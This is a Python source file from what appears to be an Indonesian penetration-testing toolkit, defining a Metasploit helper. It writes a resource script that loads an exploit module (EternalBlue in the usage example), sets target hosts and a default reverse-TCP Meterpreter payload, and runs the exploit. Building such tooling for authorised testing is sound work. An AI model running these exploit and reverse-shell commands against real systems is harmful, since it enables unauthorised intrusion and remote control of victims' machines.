from typing import Dict, Any, List
from aleopantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
import os

class MetasploitHelper(BaseTool):
    """
    Helper untuk interaksi dengan Metasploit Framework (msfconsole)
    """
    
    def __init__(self):
        metadata = ToolMetadata(
            name="Metasploit Helper",
            category=ToolCategory.EXPLOIT,
            version="3.0.0",
            author="Aleocrophic Team",
            description="Assists in generating resource scripts for Metasploit",
            usage="aleopantest run msf-helper --module exploit/windows/smb/ms17_010_eternalblue --rhosts 192.168.1.1",
            requirements=["metasploit-framework"],
            tags=["exploit", "metasploit", "automation"],
            risk_level="HIGH",
            legal_disclaimer="Hanya gunakan untuk pengujian penetrasi resmi.",
            form_schema=[
                {
                    "name": "module",
                    "type": "text",
                    "label": "MSF Module",
                    "placeholder": "exploit/...",
                    "required": True
                },
                {
                    "name": "rhosts",
                    "type": "text",
                    "label": "Remote Hosts",
                    "required": True
                },
                {
                    "name": "payload",
                    "type": "text",
                    "label": "Payload",
                    "default": "windows/x64/meterpreter/reverse_tcp"
                }
            ]
        )
        super().__init__(metadata)

    def run(self, module: str, rhosts: str, payload: str = None, **kwargs) -> Dict[str, Any]:
        self.logger.info(f"Preparing Metasploit resource script for: {module}")
        
        script_content = [
            f"use {module}",
            f"set RHOSTS {rhosts}",
            f"set PAYLOAD {payload or 'windows/x64/meterpreter/reverse_tcp'}",
            "set EXITFUNC thread",
            "exploit -j"
        ]
        
        output_file = "msf_exploit.rc"
        with open(output_file, "w") as f:
            f.write("\n".join(script_content))
            
        return {
            "status": "success",
            "message": f"Resource script generated: {output_file}",
            "commands": script_content,
            "next_step": f"Run with: msfconsole -r {output_file}"
        }

def get_tool():
    return MetasploitHelper()
